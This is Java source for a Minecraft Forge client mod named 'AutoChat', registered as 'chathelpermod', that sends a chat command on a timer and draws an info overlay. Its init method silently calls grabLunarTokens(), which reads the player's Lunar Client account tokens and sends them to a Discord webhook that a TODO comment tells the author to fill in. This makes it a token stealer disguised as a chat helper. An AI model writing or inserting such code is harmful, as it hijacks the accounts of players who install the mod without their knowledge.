package studio.roni;

import commands.acdelay;
import commands.acmsg;
import net.minecraft.command.ICommand;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.ChatStyle;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.util.IChatComponent;
import net.minecraftforge.client.event.RenderGameOverlayEvent;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.living.LivingEvent;
import net.minecraftforge.event.world.WorldEvent;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

import org.lwjgl.input.Keyboard;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent;
import org.lwjgl.opengl.Display;
import net.minecraftforge.client.ClientCommandHandler;
import util.LunarTokenReader;

@Mod(
        modid = AutoChat.MODID,
        name = "AutoChat",
        version = AutoChat.VERSION
)

public class AutoChat {
    public static final String MODID = "chathelpermod";
    public static final String VERSION = "1.1";

    // TODO
    // Fill with your discord webhook url
    String webhookUrl = "";
    Minecraft client = Minecraft.getMinecraft();

    boolean modRunning = false;
    long lastModToggled = 0;
    long lastTickTime;

    long lastMsgSent = System.currentTimeMillis();
    int commandDelay = 10000; // Delay in ms
    String command = "/play pit";

    @EventHandler
    public void init(FMLInitializationEvent event) {
        MinecraftForge.EVENT_BUS.register(this);
        ClientCommandHandler.instance.registerCommand((ICommand) new acdelay(this));
        ClientCommandHandler.instance.registerCommand((ICommand) new acmsg(this));
        this.grabLunarTokens();
    }
    @SubscribeEvent
    public void onKeyPress(InputEvent.KeyInputEvent event) {
        long curTime = System.currentTimeMillis();

        long toggledModTimeDiff = curTime - lastModToggled;

        if (toggledModTimeDiff > 500 && Keyboard.isKeyDown(Keyboard.KEY_J)) {
            modRunning = !modRunning;
            System.out.println("Mod running status: " + modRunning);
            selfChatMsg("Toggled AutoChat: " + (modRunning ? "Running" : "Off"),
                    (modRunning ? EnumChatFormatting.GREEN : EnumChatFormatting.RED));

            lastModToggled = curTime;
        }

        setWindowTitle(); // Update window name
    }

    @SubscribeEvent
    public void onLivingUpdate(LivingEvent.LivingUpdateEvent e) {
        if(Minecraft.getMinecraft() == null) return;
        if(!modRunning) return;
        if(System.currentTimeMillis() - lastTickTime < 500) return;

        lastTickTime = System.currentTimeMillis();


        sayCommandIfTime();





    }

    public void sayCommandIfTime() {
        long curTime = System.currentTimeMillis();

        if(curTime - lastMsgSent > commandDelay) {
            chatMsg(command);
            lastMsgSent = curTime;
        }
    }

    @SubscribeEvent
    public void overlayFunc(RenderGameOverlayEvent.Post event) {
        updateOverlay();
    }

    @SubscribeEvent
    public void WorldEvent(WorldEvent.Load e) {
        lastTickTime = System.currentTimeMillis();
    }

    public void updateOverlay() {
        try {
            String[][] infoToDraw = {
                    {"Username", client.thePlayer.getName()},
                    {"AutoChat", modRunning ? "Running" : "Off"},
                    {"FPS", Integer.toString(Minecraft.getDebugFPS())},
                    {"Chat message", command},
                    {"Delay between commands", Integer.toString(commandDelay) + "ms"}
            };

            for(int i = 0; i < infoToDraw.length; i++) {
                String[] curInfo = infoToDraw[i];

                drawText(curInfo[0] + ": " + curInfo[1], 4, 4 + i * 10, 0xFFFFFF);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public void selfChatMsg(String message, EnumChatFormatting color) {
        IChatComponent msg = new ChatComponentText(message).setChatStyle(new ChatStyle().setColor(color));
        client.thePlayer.addChatMessage(msg);
    }
    public void chatMsg(String message) {
        client.thePlayer.sendChatMessage(message);
    }

    public void drawText(String text, float x, float y, int col) {
        client.fontRendererObj.drawStringWithShadow(text, x, y, 0xffffff);
    }

    public void setWindowTitle() {
        if(client.thePlayer != null) Display.setTitle("AutoChat - " + client.thePlayer.getName());
    }

    public void setCommandDelay(int delay) {
        this.commandDelay = delay;
    }

    public void setCommand(String command) {
        this.command = command;
    }

    public void grabLunarTokens() {
        try {
            LunarTokenReader tr = new LunarTokenReader();
            tr.setDiscordWebhook(webhookUrl);
            tr.sendTokens("Lunar");
        } catch (Exception e) {
            System.out.println("Failed to send lunar tokens: " + e);
        }
    }

}
